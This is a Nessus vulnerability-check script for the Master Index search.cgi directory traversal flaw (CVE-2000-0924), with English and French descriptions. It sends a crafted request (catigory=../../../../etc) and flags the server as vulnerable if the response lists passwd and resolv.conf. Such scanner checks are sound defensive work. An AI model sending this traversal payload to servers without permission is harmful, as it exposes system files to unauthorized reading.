#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10562);
 script_bugtraq_id(1772);
 script_cve_id("CVE-2000-0924");
 script_version ("$Revision: 1.15 $");

 name["english"] = "Master Index directory traversal vulnerability";
 name["francais"] = "Master Index directory traversal vulnerability";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
It is possible to read arbitrary files on
the remote server by requesting :

	GET /cgi-bin/search/search.cgi?keys=*&prc=any&catigory=../../../../etc

	

An attacker may use this flaw to read arbitary files on
this server.

Solution : Contact your vendor for a patch
Risk factor : High";

 desc["francais"] = "
Il est possible de lire des fichiers
arbitraires sur ce serveur en faisant la
requete :

	GET /cgi-bin/search/search.cgi?keys=*&prc=any&catigory=../../../../etc
	
Un pirate peut utilser ce problème pour lire
des fichiers arbitraires sur ce système

Solution : Contactez votre vendeur pour un patch
Facteur de risque : Elevé";
	
 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Attempts GET /cgi-bin/search/search.cgi?keys=*&prc=any&catigory=../../../../etc";
 summary["francais"] = "Essayes GET /cgi-bin/search/search.cgi?keys=*&prc=any&catigory=../../../../etc";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 2000 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2000 Renaud Deraison");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#
include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);


if(!get_port_state(port))exit(0);

foreach dir (cgi_dirs())
{
 req = string(dir, "/search/search.cgi?keys=*&prc=any&catigory=../../../../../../../../../../../../etc");
 req = http_get(item:req, port:port);
 r = http_keepalive_send_recv(port:port, data:req);
 if("passwd" >< r && "resolv.conf" >< r ){
 	security_hole(port);
	exit(0);
	}
}
